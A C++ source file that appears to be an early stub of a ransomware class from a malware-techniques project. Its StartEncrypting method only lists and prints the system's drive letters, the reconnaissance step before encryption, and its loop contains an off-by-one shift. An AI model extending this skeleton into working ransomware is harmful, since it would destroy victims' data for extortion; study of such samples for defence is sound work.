#include "ransomware.h"
#include "../MalwareTechniques/ntdll.h"
#include "../Logger/logger.h"

#include <iostream>

#include <Windows.h>

namespace maltech {

    namespace ransom {

        Ransomware::Ransomware(ntdll::NtDll& ntdll)
            : ntdll_(ntdll)
        {
        }

        void Ransomware::StartEncrypting() {
            DWORD drivers = GetLogicalDrives();
            const int bits_in_byte = 8;
            const int dword_bits_size = sizeof(DWORD) * bits_in_byte;
            for (DWORD i = 0; i <= dword_bits_size; ++i) {
                DWORD bit_checker = 1;
                if ((bit_checker << (dword_bits_size - i)) & drivers) {
                    std::cout << static_cast<char>('A' + dword_bits_size - i) << std::endl;
                }
            }
        }

    }

}